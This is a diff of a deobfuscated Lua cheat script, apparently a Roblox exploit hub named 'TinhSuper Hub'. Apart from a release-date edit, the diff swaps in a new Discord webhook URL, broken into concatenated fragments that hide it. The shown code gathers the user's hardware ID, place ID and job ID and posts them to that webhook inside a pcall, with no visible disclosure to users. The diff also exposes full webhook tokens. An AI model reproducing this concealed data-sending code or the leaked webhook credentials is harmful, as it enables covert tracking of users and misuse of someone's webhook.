@@ -1,3 +1,6 @@
+
+
+--DEOBFUSCATED BY _NYZLINH
 local L_1_ = {}
 L_1_[2] = table["concat"]
 do
@@ -2381,7 +2384,7 @@ L_1_[93]["Info"]:AddSection("Information")
 L_1_[93]["Info"]:AddDiscordInvite({
 	["Name"] = "TinhSuper Hub",
 	["Description"] = L_1_[2]({
-		"Release Date [10/1/";
+		"Release Date [11/1/";
 		"2026]"
 	}),
 	["Logo"] = L_1_[2]({
@@ -16492,11 +16495,12 @@ L_1_[99] = gethwid and gethwid() or "Unknown HWID"
 L_1_[118] = game["PlaceId"] or 0
 L_1_[106] = game["JobId"] or "Unknown"
 L_1_[61] = L_1_[2]({
-	"https://discord.com/";
-        "api/webhooks/1459399";
-        "998457253898/0OuqxG7FwFp2Fs";
-        "DlGuniEtNgL4mSju_QIDZ-0O5an";
-        "_OmuI1XdFpfhAVvoVcsTH5MR8Lx";
+	"https://discord.com/api/";
+	"webhooks/145978187635176";
+	"2494/emUzxZi2LCQFaonyXrW";
+	"oDfMKAigwjKoszaxt9PGf4tw";
+	"HOmLv25KAso6FVbIaE04al0_";
+	"H";
 })
 L_1_[71] = {
 	["embeds"] = {
@@ -16585,5 +16589,4 @@ pcall(function()
 		["Headers"] = L_1_[37];
 		["Body"] = L_1_[114]
 	})
-
 end)
